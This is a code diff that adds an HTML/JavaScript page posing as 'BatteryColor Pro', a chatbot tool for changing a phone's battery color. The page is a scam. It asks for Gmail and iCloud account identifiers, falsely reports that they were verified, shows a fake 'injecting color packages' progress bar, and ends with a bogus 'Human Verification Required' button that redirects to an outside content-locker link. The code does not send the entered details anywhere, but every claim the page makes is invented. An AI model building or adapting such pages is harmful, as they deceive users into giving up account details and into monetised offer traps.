@@ -9,8 +9,8 @@
     
     <style>
         :root {
-            --battery-green: #34c759;
-            --battery-accent: #007aff;
+            --snap-yellow: #00ff66; /* غيّرنا اللون الأخضر ليناسب الثيم الجديد والبطارية */
+            --snap-black: #000000;
             --bg-chat: #09090b;
             --bg-workspace: #020202;
             --bg-bubble-user: #1c1c1e;
@@ -64,8 +64,8 @@
             background: var(--bg-chat);
             background-image: 
                 radial-gradient(var(--border-color) 1px, transparent 0),
-                linear-gradient(to right, rgba(52,199,89,0.01) 1px, transparent 1px),
-                linear-gradient(to bottom, rgba(52,199,89,0.01) 1px, transparent 1px);
+                linear-gradient(to right, rgba(0,255,102,0.01) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(0,255,102,0.01) 1px, transparent 1px);
             background-size: 24px 24px, 40px 40px, 40px 40px;
             display: flex;
             flex-direction: column;
@@ -118,10 +118,7 @@
             align-items: center;
         }
         .ai-brand .part-snap {
-            color: var(--battery-green);
-        }
-        .ai-brand .part-tools {
-            color: var(--text-main);
+            color: var(--snap-yellow);
         }
 
         .header-actions {
@@ -153,4 +150,600 @@
             background: var(--menu-bg);
             backdrop-filter: blur(12px);
             border: 1px solid var(--border-color);
-            border-radius: 16px
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 1000;
+        }
+
+        .menu-item {
+            padding: 14px 16px;
+            color: var(--text-main);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .menu-item:last-child { border-bottom: none; }
+        .menu-item i { color: var(--snap-yellow); width: 16px; text-align: center; }
+
+        .chat-history {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 22px;
+            z-index: 5;
+        }
+
+        .chat-row {
+            display: flex;
+            gap: 14px;
+            max-width: 100%;
+        }
+
+        .chat-row.user-row { 
+            flex-direction: row-reverse; 
+        }
+
+        .bot-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--snap-yellow);
+            color: #000;
+            font-size: 16px;
+        }
+
+        .msg-bubble {
+            font-size: 15px;
+            line-height: 1.5;
+            max-width: 85%;
+            color: var(--text-main);
+            padding-top: 6px;
+        }
+
+        .user-row .msg-bubble {
+            background: var(--bg-bubble-user);
+            padding: 12px 18px;
+            border-radius: 18px;
+            max-width: 75%;
+            font-weight: 500;
+        }
+
+        .typing-dots {
+            display: inline-flex;
+            gap: 4px;
+            align-items: center;
+            padding: 8px 0;
+        }
+        .typing-dots span {
+            width: 6px;
+            height: 6px;
+            background: var(--text-muted);
+            border-radius: 50%;
+            animation: bounceDot 1.4s infinite ease-in-out both;
+        }
+        .typing-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .typing-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounceDot { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+
+        .options-box {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 16px;
+            width: 100%;
+        }
+
+        .chat-opt-btn {
+            background: var(--chat-btn-bg);
+            border: 1px solid var(--chat-btn-border);
+            color: var(--text-main);
+            padding: 18px 16px;
+            border-radius: 18px;
+            text-align: left;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+        
+        .btn-left-content {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .chat-opt-btn i.btn-icon {
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+            color: var(--snap-yellow);
+        }
+
+        .media-preview-container {
+            border: 1px solid var(--border-color);
+            background: var(--chat-btn-bg);
+            border-radius: 16px;
+            margin-top: 16px;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .media-header-label {
+            padding: 12px 16px;
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .progress-block { margin-top: 16px; width: 100%; }
+        .progress-labels { display: flex; justify-content: space-between; font-size: 14px; color: var(--text-main); margin-bottom: 8px; font-weight: 500; }
+        .progress-bar-bg { width: 100%; background: var(--border-color); height: 4px; border-radius: 10px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: var(--snap-yellow); width: 0%; }
+
+        .offer-verification-card {
+            border: 1px dashed var(--text-muted);
+            background: transparent;
+            border-radius: 20px;
+            padding: 32px 20px;
+            margin-top: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            gap: 16px;
+            width: 100%;
+        }
+
+        .offer-verification-card h4 { font-size: 19px; font-weight: 700; color: var(--text-main); }
+        .offer-verification-card p { font-size: 14px; color: var(--text-muted); line-height: 1.6; }
+        .verification-icon { color: var(--snap-black); background: var(--snap-yellow); width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; }
+
+        .gpt-action-btn {
+            width: 100%;
+            background: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            padding: 16px;
+            border-radius: 28px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 8px;
+        }
+
+        /* تعديل منطقة الإدخال لتستوعب خانتين وزر الإرسال */
+        .chat-input-area { 
+            padding: 16px; 
+            background: var(--bg-chat);
+            z-index: 10;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .multi-input-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .input-wrapper {
+            background: var(--chat-btn-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            padding: 4px 16px;
+        }
+
+        .input-wrapper i {
+            color: var(--text-muted);
+            margin-right: 12px;
+            font-size: 14px;
+            width: 16px;
+            text-align: center;
+        }
+
+        .gpt-input { 
+            background: transparent; 
+            border: none; 
+            outline: none; 
+            color: var(--text-main); 
+            font-size: 14px; 
+            flex-grow: 1; 
+            padding: 12px 0; 
+        }
+        .gpt-input::placeholder { color: var(--text-muted); }
+        
+        .submit-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 4px;
+        }
+
+        .send-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--text-main);
+            color: var(--bg-chat);
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            font-weight: 700;
+            gap: 8px;
+            transition: background-color 0.3s;
+        }
+
+        .footer-banner {
+            text-align: center;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 14px;
+        }
+
+        .hidden-row { display: none !important; }
+
+        .custom-alert {
+            position: fixed;
+            top: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-120px);
+            background: var(--alert-bg);
+            backdrop-filter: blur(14px);
+            color: #ff4444;
+            border: 1px solid var(--alert-border);
+            padding: 14px 22px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.5);
+            z-index: 9999;
+            transition: transform 0.4s ease, opacity 0.4s;
+            opacity: 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .custom-alert.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="custom-alert" id="errorAlert">
+        <i class="fa-solid fa-circle-exclamation"></i> <span id="alertText">Please fill in all fields!</span>
+    </div>
+
+    <div class="chat-container">
+        <div class="chat-header">
+            <div class="header-left">
+                <button class="menu-bars-btn" onclick="toggleSnapMenu(event)">
+                    <i class="fa-solid fa-bars"></i>
+                </button>
+                <div class="brand-wrapper">
+                    <span class="ai-brand">
+                        <span class="part-snap"><i class="fa-solid fa-battery-three-quarters"></i> Battery</span><span>Color</span>
+                    </span>
+                </div>
+            </div>
+            <div class="header-actions">
+                <button class="theme-btn" id="themeToggleBtn" onclick="toggleThemeNode()">
+                    <i class="fa-solid fa-moon"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="snap-dropdown-menu" id="snapMenu">
+            <a href="#" class="menu-item"><i class="fa-solid fa-shield"></i> Secure Connection</a>
+            <a href="#" class="menu-item"><i class="fa-solid fa-gear"></i> Settings</a>
+        </div>
+
+        <div class="chat-history" id="chatWindow">
+            <div class="chat-row ai-row" id="welcomeMsg">
+                <div class="bot-avatar"><i class="fa-solid fa-robot"></i></div>
+                <div class="msg-bubble" id="welcomeText"></div>
+            </div>
+
+            <div class="chat-row ai-row hidden-row" id="typingBubble">
+                <div class="bot-avatar"><i class="fa-solid fa-robot"></i></div>
+                <div class="msg-bubble"><div class="typing-dots"><span></span><span></span><span></span></div></div>
+            </div>
+        </div>
+
+        <div class="chat-input-area">
+            <div class="multi-input-container" id="inputSection">
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-envelope"></i>
+                    <input type="email" class="gpt-input" id="gmailField" placeholder="Enter Gmail Address..." autocomplete="off">
+                </div>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-cloud"></i>
+                    <input type="text" class="gpt-input" id="icloudField" placeholder="Enter iCloud ID..." autocomplete="off">
+                </div>
+                <div class="submit-container">
+                    <button class="send-btn" id="sendBtn" onclick="submitData()">
+                        <span>Inject Battery Color</span> <i class="fa-solid fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="footer-banner">Secure SSL Tunnels. Battery Customizer Console 2026.</div>
+        </div>
+    </div>
+
+    <script>
+        const chatWindow = document.getElementById('chatWindow');
+        const gmailField = document.getElementById('gmailField');
+        const icloudField = document.getElementById('icloudField');
+        const sendBtn = document.getElementById('sendBtn');
+        const typingBubble = document.getElementById('typingBubble');
+        const themeToggleBtn = document.getElementById('themeToggleBtn');
+        const snapMenu = document.getElementById('snapMenu');
+        const errorAlert = document.getElementById('errorAlert');
+        const alertText = document.getElementById('alertText');
+        const inputSection = document.getElementById('inputSection');
+
+        let isProcessingStarted = false;
+        let alertTimeout = null;
+
+        document.body.setAttribute('data-theme', 'dark');
+        
+        function toggleThemeNode() {
+            const currentTheme = document.body.getAttribute('data-theme');
+            if(currentTheme === 'dark') {
+                document.body.setAttribute('data-theme', 'light');
+                themeToggleBtn.innerHTML = `<i class="fa-solid fa-sun"></i>`;
+            } else {
+                document.body.setAttribute('data-theme', 'dark');
+                themeToggleBtn.innerHTML = `<i class="fa-solid fa-moon"></i>`;
+            }
+        }
+
+        function toggleSnapMenu(event) {
+            event.stopPropagation();
+            snapMenu.style.display = snapMenu.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        document.addEventListener('click', () => { snapMenu.style.display = 'none'; });
+
+        function typeWriterEffect(elementId, text, speed = 12, callback = null) {
+            let i = 0;
+            const element = document.getElementById(elementId);
+            element.innerHTML = '';
+            function type() {
+                if (i < text.length) {
+                    element.innerHTML += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                    chatWindow.scrollTop = chatWindow.scrollHeight;
+                } else if (callback) {
+                    callback();
+                }
+            }
+            type();
+        }
+
+        window.onload = () => {
+            const explanation = "Welcome to BatteryColor Pro. Please input your Gmail and iCloud info below to connect your device dashboard and start tweaking your status bar battery color.";
+            typeWriterEffect("welcomeText", explanation, 12);
+        };
+
+        function showTyping() {
+            chatWindow.appendChild(typingBubble);
+            typingBubble.classList.remove('hidden-row');
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+        }
+
+        function hideTyping() { typingBubble.classList.add('hidden-row'); }
+
+        function appendUserMessage(text) {
+            const row = document.createElement('div');
+            row.className = 'chat-row user-row';
+            row.innerHTML = `<div class="msg-bubble">${text}</div>`;
+            chatWindow.appendChild(row);
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+        }
+
+        function showAlertNotification(msg) {
+            alertText.innerText = msg;
+            if(alertTimeout) clearTimeout(alertTimeout);
+            errorAlert.classList.add('show');
+            alertTimeout = setTimeout(() => { errorAlert.classList.remove('show'); }, 3000);
+        }
+
+        function submitData() {
+            const gmailVal = gmailField.value.trim();
+            const icloudVal = icloudField.value.trim();
+            
+            if (gmailVal === '' || icloudVal === '') {
+                showAlertNotification('Please enter both Gmail and iCloud accounts!');
+                return;
+            }
+
+            if(isProcessingStarted) return; 
+            isProcessingStarted = true;
+
+            // إخفاء منطقة الإدخال بعد الإرسال لإعطاء طابع كونسول احترافي
+            inputSection.style.display = 'none';
+
+            appendUserMessage(`Gmail: ${gmailVal} <br> iCloud: ${icloudVal}`);
+
+            setTimeout(() => {
+                showTyping();
+                
+                setTimeout(() => {
+                    hideTyping();
+                    const nextId = 'ai_' + Date.now();
+                    const row = document.createElement('div');
+                    row.className = 'chat-row ai-row';
+                    row.innerHTML = `
+                        <div class="bot-avatar"><i class="fa-solid fa-robot"></i></div>
+                        <div class="msg-bubble" id="${nextId}"></div>
+                    `;
+                    chatWindow.appendChild(row);
+                    
+                    const responseText = `Device accounts verified successfully. Select your desired target battery color palette from the cloud layers below:`;
+                    
+                    typeWriterEffect(nextId, responseText, 10, () => {
+                        const optionsHtml = `
+                            <div class="options-box">
+                                <button class="chat-opt-btn" onclick="selectColor('Chroma Neon Green')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#00ff66;"></i>
+                                        <span class="btn-title">Chroma Neon Green</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                                <button class="chat-opt-btn" onclick="selectColor('Electric Hot Pink')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#ff007f;"></i>
+                                        <span class="btn-title">Electric Hot Pink</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                                <button class="chat-opt-btn" onclick="selectColor('Deep Sapphire Blue')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#0077ff;"></i>
+                                        <span class="btn-title">Deep Sapphire Blue</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                                <button class="chat-opt-btn" onclick="selectColor('Cyberpunk Crimson Red')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#ff2a2a;"></i>
+                                        <span class="btn-title">Cyberpunk Crimson Red</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                            </div>
+                        `;
+                        document.getElementById(nextId).innerHTML += optionsHtml;
+                        chatWindow.scrollTop = chatWindow.scrollHeight;
+                    });
+                }, 1000);
+            }, 800);
+        }
+
+        function selectColor(colorName) {
+            const btns = document.querySelectorAll('.chat-opt-btn');
+            btns.forEach(b => b.removeAttribute('onclick'));
+
+            appendUserMessage(`Selected Color: ${colorName}`);
+
+            setTimeout(() => {
+                showTyping();
+
+                setTimeout(() => {
+                    hideTyping();
+                    
+                    const barId = 'bar_' + Date.now();
+                    const txtId = 'txt_' + Date.now();
+
+                    const nextId = 'ai_load_' + Date.now();
+                    const row = document.createElement('div');
+                    row.className = 'chat-row ai-row';
+                    row.innerHTML = `
+                        <div class="bot-avatar"><i class="fa-solid fa-robot"></i></div>
+                        <div class="msg-bubble" id="${nextId}"></div>
+                    `;
+                    chatWindow.appendChild(row);
+
+                    const loadingIntro = `Compiling system framework assets for ${colorName}. Modifying OS status bar parameters:`;
+                    
+                    typeWriterEffect(nextId, loadingIntro, 10, () => {
+                        const loadingHtml = `
+                            <div class="progress-block">
+                                <div class="progress-labels">
+                                    <span>Injecting color packages...</span>
+                                    <span id="${txtId}" style="font-weight:600;">0%</span>
+                                </div>
+                                <div class="progress-bar-bg">
+                                    <div class="progress-bar-fill" id="${barId}"></div>
+                                </div>
+                            </div>
+                        `;
+                        document.getElementById(nextId).innerHTML += loadingHtml;
+                        animateProgressBarNode(barId, txtId);
+                    });
+
+                }, 800);
+            }, 600);
+        }
+
+        function animateProgressBarNode(barId, txtId) {
+            let percentage = 0;
+            const fill = document.getElementById(barId);
+            const text = document.getElementById(txtId);
+
+            const loop = setInterval(() => {
+                percentage += 2;
+                if(fill) fill.style.width = percentage + '%';
+                if(text) text.innerText = percentage + '%';
+
+                if(percentage >= 100) {
+                    clearInterval(loop);
+                    setTimeout(() => {
+                        showTyping();
+                        setTimeout(() => {
+                            hideTyping();
+                            
+                            const finalCardId = 'final_' + Date.now();
+                            const row = document.createElement('div');
+                            row.className = 'chat-row ai-row';
+                            row.innerHTML = `
+                                <div class="bot-avatar"><i class="fa-solid fa-robot"></i></div>
+                                <div class="msg-bubble" id="${finalCardId}"></div>
+                            `;
+                            chatWindow.appendChild(row);
+
+                            const finalOfferHtml = `
+                                <div class="offer-verification-card">
+                                    <div class="verification-icon"><i class="fa-solid fa-user-shield"></i></div>
+                                    <h4>Human Verification Required</h4>
+                                    <p>The injection package was successfully structured. To prevent automated bot exploit and deploy changes permanently to your hardware device, please pass the validation protocol below.</p>
+                                    <button class="gpt-action-btn" onclick="redirectToOgadsLocker()">
+                                        <i class="fa-solid fa-key"></i> Apply Changes Now
+                                    </button>
+                                </div>
+                            `;
+                            document.getElementById(finalCardId).innerHTML = finalOfferHtml;
+                            chatWindow.scrollTop = chatWindow.scrollHeight;
+                        }, 1000);
+                    }, 400);
+                }
+            }, 35);
+        }
+
+        function redirectToOgadsLocker() {
+            window.location.href = "https://appsave.space/cl/i/rnernk";
+        }
+    </script>
+</body>
+</html>
